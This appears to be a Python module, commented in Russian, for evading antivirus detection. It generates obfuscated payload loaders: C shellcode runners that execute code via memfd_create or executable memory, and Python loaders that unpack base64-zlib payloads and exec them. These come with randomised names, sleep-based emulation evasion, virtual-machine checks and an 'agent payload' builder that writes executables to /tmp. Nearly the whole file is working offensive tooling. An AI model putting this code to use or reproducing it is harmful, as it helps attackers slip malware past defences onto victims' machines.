#!/usr/bin/env python3
"""
Модуль для обхода антивирусной защиты.
Адаптированные техники из Veil, TheFatRat и Unicorn.
"""

import os
import random
import string
import base64
import zlib
import subprocess
from typing import Dict, Any, Optional, List, Tuple

# Настройка логирования
import logging
logger = logging.getLogger('av_evasion')

class AVEvasion:
    """Класс с методами обхода антивирусной защиты."""
    
    @staticmethod
    def generate_random_string(length: int = 12) -> str:
        """Генерация случайной строки указанной длины."""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    @staticmethod
    def encode_payload(payload: bytes, method: str = "base64") -> Tuple[bytes, str]:
        """
        Кодирование полезной нагрузки различными методами.
        
        Параметры:
        - payload: Исходная полезная нагрузка в байтах
        - method: Метод кодирования ("base64", "xor", "aes", "compress+base64")
        
        Возвращает:
        - Кодированную полезную нагрузку и ключ (если применимо)
        """
        if method == "base64":
            return base64.b64encode(payload), ""
        
        elif method == "xor":
            # Генерация случайного XOR-ключа
            key = bytes([random.randint(1, 255) for _ in range(8)])
            encoded = bytes([b ^ key[i % len(key)] for i, b in enumerate(payload)])
            return encoded, base64.b64encode(key).decode()
        
        elif method == "compress+base64":
            # Сжатие + base64
            compressed = zlib.compress(payload)
            return base64.b64encode(compressed), ""
        
        else:
            # По умолчанию base64
            return base64.b64encode(payload), ""
    
    @staticmethod
    def generate_shellcode_loader(shellcode: bytes, method: str = "memfd") -> str:
        """
        Генерация загрузчика шеллкода с использованием различных техник обхода AV.
        
        Параметры:
        - shellcode: Бинарный шеллкод
        - method: Метод загрузки шеллкода
        
        Возвращает:
        - Строку с C-кодом загрузчика
        """
        # Кодирование шеллкода
        encoded_shellcode, key = AVEvasion.encode_payload(shellcode, "base64")
        encoded_shellcode_str = encoded_shellcode.decode()
        
        # Случайные имена функций и переменных
        func_decode = AVEvasion.generate_random_string()
        func_execute = AVEvasion.generate_random_string()
        var_shellcode = AVEvasion.generate_random_string()
        var_buffer = AVEvasion.generate_random_string()
        
        if method == "memfd":
            # Техника memfd_create (работает только на Linux)
            code = f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define _GNU_SOURCE
#include <fcntl.h>

// Определение memfd_create для систем без нужного заголовочного файла
static inline int my_memfd_create(const char *name, unsigned int flags) {{
    return syscall(__NR_memfd_create, name, flags);
}}

// Декодирование Base64
unsigned char* {func_decode}(const char *encoded_data, size_t *output_size) {{
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t encoded_len = strlen(encoded_data);
    size_t padding = 0;
    
    if (encoded_len % 4 != 0) {{
        fprintf(stderr, "Invalid base64 string length\\n");
        return NULL;
    }}
    
    if (encoded_data[encoded_len - 1] == '=') padding++;
    if (encoded_data[encoded_len - 2] == '=') padding++;
    
    *output_size = (encoded_len / 4) * 3 - padding;
    unsigned char *decoded_data = (unsigned char *)malloc(*output_size);
    
    if (!decoded_data) {{
        fprintf(stderr, "Memory allocation failed\\n");
        return NULL;
    }}
    
    for (size_t i = 0, j = 0; i < encoded_len;) {{
        uint32_t sextet_a = encoded_data[i] == '=' ? 0 & i++ : strchr(base64_chars, encoded_data[i++]) - base64_chars;
        uint32_t sextet_b = encoded_data[i] == '=' ? 0 & i++ : strchr(base64_chars, encoded_data[i++]) - base64_chars;
        uint32_t sextet_c = encoded_data[i] == '=' ? 0 & i++ : strchr(base64_chars, encoded_data[i++]) - base64_chars;
        uint32_t sextet_d = encoded_data[i] == '=' ? 0 & i++ : strchr(base64_chars, encoded_data[i++]) - base64_chars;
        
        uint32_t triple = (sextet_a << 18) + (sextet_b << 12) + (sextet_c << 6) + sextet_d;
        
        if (j < *output_size) decoded_data[j++] = (triple >> 16) & 0xFF;
        if (j < *output_size) decoded_data[j++] = (triple >> 8) & 0xFF;
        if (j < *output_size) decoded_data[j++] = triple & 0xFF;
    }}
    
    return decoded_data;
}}

// Выполнение шеллкода
void {func_execute}() {{
    // Закодированный шеллкод
    const char *{var_shellcode} = "{encoded_shellcode_str}";
    
    // Декодирование шеллкода
    size_t size;
    unsigned char *{var_buffer} = {func_decode}({var_shellcode}, &size);
    
    if (!{var_buffer}) {{
        fprintf(stderr, "Decoding failed\\n");
        return;
    }}
    
    // Создание анонимного файла
    int fd = my_memfd_create("", 1);
    if (fd == -1) {{
        fprintf(stderr, "memfd_create failed\\n");
        free({var_buffer});
        return;
    }}
    
    // Запись шеллкода в файл
    if (write(fd, {var_buffer}, size) != size) {{
        fprintf(stderr, "Write failed\\n");
        close(fd);
        free({var_buffer});
        return;
    }}
    
    // Освобождение буфера
    free({var_buffer});
    
    // Запуск шеллкода как исполняемого файла
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    
    char *const args[] = {{fd_path, NULL}};
    execve(fd_path, args, NULL);
    
    // Если execve вернул ошибку
    close(fd);
}}

int main() {{
    // Добавим случайную задержку для обхода эмуляции
    sleep(3);
    
    // Выполнение шеллкода
    {func_execute}();
    
    return 0;
}}
"""
        else:
            # Классический метод с VirtualAlloc/mprotect
            code = f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

// Декодирование Base64
unsigned char* {func_decode}(const char *encoded_data, size_t *output_size) {{
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t encoded_len = strlen(encoded_data);
    size_t padding = 0;
    
    if (encoded_len % 4 != 0) {{
        fprintf(stderr, "Invalid base64 string length\\n");
        return NULL;
    }}
    
    if (encoded_data[encoded_len - 1] == '=') padding++;
    if (encoded_data[encoded_len - 2] == '=') padding++;
    
    *output_size = (encoded_len / 4) * 3 - padding;
    unsigned char *decoded_data = (unsigned char *)malloc(*output_size);
    
    if (!decoded_data) {{
        fprintf(stderr, "Memory allocation failed\\n");
        return NULL;
    }}
    
    for (size_t i = 0, j = 0; i < encoded_len;) {{
        uint32_t sextet_a = encoded_data[i] == '=' ? 0 & i++ : strchr(base64_chars, encoded_data[i++]) - base64_chars;
        uint32_t sextet_b = encoded_data[i] == '=' ? 0 & i++ : strchr(base64_chars, encoded_data[i++]) - base64_chars;
        uint32_t sextet_c = encoded_data[i] == '=' ? 0 & i++ : strchr(base64_chars, encoded_data[i++]) - base64_chars;
        uint32_t sextet_d = encoded_data[i] == '=' ? 0 & i++ : strchr(base64_chars, encoded_data[i++]) - base64_chars;
        
        uint32_t triple = (sextet_a << 18) + (sextet_b << 12) + (sextet_c << 6) + sextet_d;
        
        if (j < *output_size) decoded_data[j++] = (triple >> 16) & 0xFF;
        if (j < *output_size) decoded_data[j++] = (triple >> 8) & 0xFF;
        if (j < *output_size) decoded_data[j++] = triple & 0xFF;
    }}
    
    return decoded_data;
}}

// Выполнение шеллкода
void {func_execute}() {{
    // Закодированный шеллкод
    const char *{var_shellcode} = "{encoded_shellcode_str}";
    
    // Декодирование шеллкода
    size_t size;
    unsigned char *{var_buffer} = {func_decode}({var_shellcode}, &size);
    
    if (!{var_buffer}) {{
        fprintf(stderr, "Decoding failed\\n");
        return;
    }}
    
    // Выделение памяти с правами на выполнение
    void *exec_mem = mmap(0, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    
    if (exec_mem == MAP_FAILED) {{
        fprintf(stderr, "Memory allocation failed\\n");
        free({var_buffer});
        return;
    }}
    
    // Копирование шеллкода в исполняемую память
    memcpy(exec_mem, {var_buffer}, size);
    
    // Освобождение буфера
    free({var_buffer});
    
    // Выполнение шеллкода
    ((void(*)())exec_mem)();
}}

int main() {{
    // Добавим случайную задержку для обхода эмуляции
    sleep(3);
    
    // Выполнение шеллкода
    {func_execute}();
    
    return 0;
}}
"""
        
        return code
    
    @staticmethod
    def generate_python_loader(payload: bytes, method: str = "exec") -> str:
        """
        Генерация Python-загрузчика для полезной нагрузки.
        
        Параметры:
        - payload: Полезная нагрузка (Python-код)
        - method: Метод выполнения ("exec", "subprocess", "ctypes")
        
        Возвращает:
        - Строку с Python-кодом загрузчика
        """
        # Кодирование полезной нагрузки
        encoded_payload, key = AVEvasion.encode_payload(payload, "compress+base64")
        encoded_payload_str = encoded_payload.decode()
        
        # Случайные имена функций и переменных
        func_decode = AVEvasion.generate_random_string()
        func_execute = AVEvasion.generate_random_string()
        var_payload = AVEvasion.generate_random_string()
        
        if method == "exec":
            # Прямое выполнение с помощью exec()
            code = f"""#!/usr/bin/env python3
import base64
import zlib
import time
import random
import sys
import os

def {func_decode}(encoded_data):
    # Декодирование Base64
    decoded = base64.b64decode(encoded_data)
    # Распаковка
    decompressed = zlib.decompress(decoded)
    return decompressed

def {func_execute}():
    # Закодированная полезная нагрузка
    {var_payload} = "{encoded_payload_str}"
    
    # Декодирование полезной нагрузки
    decoded = {func_decode}({var_payload})
    
    # Выполнение
    exec(decoded)

# Антиотладка: задержка для обхода эмуляции
time.sleep(random.uniform(1, 3))

# Антивиртуализация: проверка окружения
def check_environment():
    # Проверка наличия файлов, характерных для виртуальных машин
    vm_files = [
        "/sys/class/dmi/id/product_name",
        "/sys/devices/virtual/dmi/id/product_name",
        "/proc/scsi/scsi"
    ]
    
    for vm_file in vm_files:
        if os.path.exists(vm_file):
            try:
                with open(vm_file, 'r') as f:
                    content = f.read().lower()
                    if any(x in content for x in ["vmware", "virtualbox", "qemu", "xen"]):
                        # В реальном вредоносном ПО здесь может быть код для выхода
                        # Но мы продолжим выполнение для тестирования
                        pass
            except:
                pass

# Выполнение проверки окружения
check_environment()

# Запуск основного кода
{func_execute}()
"""
        elif method == "ctypes":
            # Выполнение с помощью ctypes
            code = f"""#!/usr/bin/env python3
import base64
import zlib
import time
import random
import sys
import os
import ctypes
import platform

def {func_decode}(encoded_data):
    # Декодирование Base64
    decoded = base64.b64decode(encoded_data)
    # Распаковка
    decompressed = zlib.decompress(decoded)
    return decompressed

def {func_execute}():
    # Закодированная полезная нагрузка
    {var_payload} = "{encoded_payload_str}"
    
    # Декодирование полезной нагрузки
    decoded = {func_decode}({var_payload})
    
    # Сохранение во временный файл
    temp_file = f"/tmp/{{random.randint(10000, 99999)}}.py"
    with open(temp_file, "wb") as f:
        f.write(decoded)
    
    # Выполнение с помощью ctypes
    if platform.system() == "Linux":
        libc = ctypes.CDLL("libc.so.6")
        system = libc.system
        system(f"python3 {{temp_file}}")
    else:
        os.system(f"python {{temp_file}}")
    
    # Удаление временного файла
    try:
        os.remove(temp_file)
    except:
        pass

# Антиотладка: задержка для обхода эмуляции
time.sleep(random.uniform(1, 3))

# Антивиртуализация: проверка окружения
def check_environment():
    # Проверка наличия файлов, характерных для виртуальных машин
    vm_files = [
        "/sys/class/dmi/id/product_name",
        "/sys/devices/virtual/dmi/id/product_name",
        "/proc/scsi/scsi"
    ]
    
    for vm_file in vm_files:
        if os.path.exists(vm_file):
            try:
                with open(vm_file, 'r') as f:
                    content = f.read().lower()
                    if any(x in content for x in ["vmware", "virtualbox", "qemu", "xen"]):
                        # В реальном вредоносном ПО здесь может быть код для выхода
                        # Но мы продолжим выполнение для тестирования
                        pass
            except:
                pass

# Выполнение проверки окружения
check_environment()

# Запуск основного кода
{func_execute}()
"""
        else:
            # По умолчанию: subprocess
            code = f"""#!/usr/bin/env python3
import base64
import zlib
import time
import random
import sys
import os
import subprocess

def {func_decode}(encoded_data):
    # Декодирование Base64
    decoded = base64.b64decode(encoded_data)
    # Распаковка
    decompressed = zlib.decompress(decoded)
    return decompressed

def {func_execute}():
    # Закодированная полезная нагрузка
    {var_payload} = "{encoded_payload_str}"
    
    # Декодирование полезной нагрузки
    decoded = {func_decode}({var_payload})
    
    # Сохранение во временный файл
    temp_file = f"/tmp/{{random.randint(10000, 99999)}}.py"
    with open(temp_file, "wb") as f:
        f.write(decoded)
    
    # Выполнение с помощью subprocess
    subprocess.Popen(["python3", temp_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Удаление временного файла (через задержку для завершения выполнения)
    def delayed_delete():
        time.sleep(5)
        try:
            os.remove(temp_file)
        except:
            pass
    
    import threading
    threading.Thread(target=delayed_delete, daemon=True).start()

# Антиотладка: задержка для обхода эмуляции
time.sleep(random.uniform(1, 3))

# Антивиртуализация: проверка окружения
def check_environment():
    # Проверка наличия файлов, характерных для виртуальных машин
    vm_files = [
        "/sys/class/dmi/id/product_name",
        "/sys/devices/virtual/dmi/id/product_name",
        "/proc/scsi/scsi"
    ]
    
    for vm_file in vm_files:
        if os.path.exists(vm_file):
            try:
                with open(vm_file, 'r') as f:
                    content = f.read().lower()
                    if any(x in content for x in ["vmware", "virtualbox", "qemu", "xen"]):
                        # В реальном вредоносном ПО здесь может быть код для выхода
                        # Но мы продолжим выполнение для тестирования
                        pass
            except:
                pass

# Выполнение проверки окружения
check_environment()

# Запуск основного кода
{func_execute}()
"""
        
        return code
    
    @staticmethod
    def create_agent_payload(agent_code: str, target_os: str = "linux", evasion_level: int = 2) -> Dict[str, Any]:
        """
        Создание полезной нагрузки агента с применением методов обхода AV.
        
        Параметры:
        - agent_code: Код агента
        - target_os: Целевая ОС ("linux", "windows", "macos")
        - evasion_level: Уровень обхода AV (1-3)
        
        Возвращает:
        - Словарь с информацией о полезной нагрузке
        """
        result = {
            "created": False,
            "error": None,
            "payload_type": None,
            "payload_file": None,
            "size": 0
        }
        
        try:
            # Сгенерируем имя временного файла
            temp_dir = "/tmp"
            random_name = AVEvasion.generate_random_string(8)
            
            if target_os.lower() == "linux":
                # Создание Linux-агента
                if evasion_level == 1:
                    # Простой Python-скрипт
                    payload_code = AVEvasion.generate_python_loader(agent_code.encode(), "exec")
                    payload_file = os.path.join(temp_dir, f"{random_name}.py")
                    with open(payload_file, 'w') as f:
                        f.write(payload_code)
                    os.chmod(payload_file, 0o755)  # Делаем исполняемым
                    result["payload_type"] = "python"
                    result["payload_file"] = payload_file
                
                elif evasion_level == 2:
                    # Python с обфускацией и антивиртуализацией
                    payload_code = AVEvasion.generate_python_loader(agent_code.encode(), "ctypes")
                    payload_file = os.path.join(temp_dir, f"{random_name}.py")
                    with open(payload_file, 'w') as f:
                        f.write(payload_code)
                    os.chmod(payload_file, 0o755)  # Делаем исполняемым
                    result["payload_type"] = "python_obfuscated"
                    result["payload_file"] = payload_file
                
                else:  # evasion_level == 3
                    # C-загрузчик шеллкода
                    # В реальном сценарии здесь мы бы компилировали шеллкод из Metasploit или аналогичного инструмента
                    # Для примера просто создадим пустой файл
                    c_code = AVEvasion.generate_shellcode_loader(b"\x90\x90\x90\x90", "memfd")
                    c_file = os.path.join(temp_dir, f"{random_name}.c")
                    with open(c_file, 'w') as f:
                        f.write(c_code)
                    
                    # Компиляция (в реальном сценарии)
                    # gcc_cmd = f"gcc -o {os.path.join(temp_dir, random_name)} {c_file} -z execstack"
                    # subprocess.run(gcc_cmd, shell=True, check=True)
                    
                    result["payload_type"] = "c_shellcode"
                    result["payload_file"] = c_file  # В реальном сценарии здесь был бы скомпилированный файл
            
            elif target_os.lower() == "windows":
                # Для Windows используем разные методы
                # В реальном сценарии здесь была бы интеграция с Veil, Unicorn или TheFatRat
                payload_code = "# Windows payload - интеграция с Veil/Unicorn"
                payload_file = os.path.join(temp_dir, f"{random_name}.py")
                with open(payload_file, 'w') as f:
                    f.write(payload_code)
                result["payload_type"] = "windows_staged"
                result["payload_file"] = payload_file
            
            else:  # macos
                # Для macOS
                payload_code = AVEvasion.generate_python_loader(agent_code.encode(), "exec")
                payload_file = os.path.join(temp_dir, f"{random_name}.py")
                with open(payload_file, 'w') as f:
                    f.write(payload_code)
                os.chmod(payload_file, 0o755)  # Делаем исполняемым
                result["payload_type"] = "macos_python"
                result["payload_file"] = payload_file
            
            # Получение размера файла
            result["size"] = os.path.getsize(result["payload_file"])
            result["created"] = True
            
        except Exception as e:
            logger.error(f"Error creating agent payload: {str(e)}")
            result["error"] = str(e)
        
        return result


# Пример использования
if __name__ == "__main__":
    # Тестирование генерации Python-загрузчика
    test_payload = """
print("Это тестовая полезная нагрузка")
import os
print(f"Текущий пользователь: {os.getenv('USER')}")
print(f"Домашняя директория: {os.getenv('HOME')}")
print("Работа завершена!")
"""
    
    python_loader = AVEvasion.generate_python_loader(test_payload.encode(), "exec")
    print("=== Python Loader ===")
    print(python_loader[:500] + "...\n")
    
    # Тестирование генерации C-загрузчика
    dummy_shellcode = b"\x90\x90\x90\x90\x90"  # NOP-sled
    c_loader = AVEvasion.generate_shellcode_loader(dummy_shellcode, "memfd")
    print("=== C Shellcode Loader ===")
    print(c_loader[:500] + "...\n")
    
    # Создание тестовой полезной нагрузки
    result = AVEvasion.create_agent_payload(test_payload, "linux", 2)
    print("=== Agent Payload ===")
    print(f"Created: {result['created']}")
    print(f"Type: {result['payload_type']}")
    print(f"File: {result['payload_file']}")
    print(f"Size: {result['size']} bytes")
    if result["error"]:
        print(f"Error: {result['error']}") 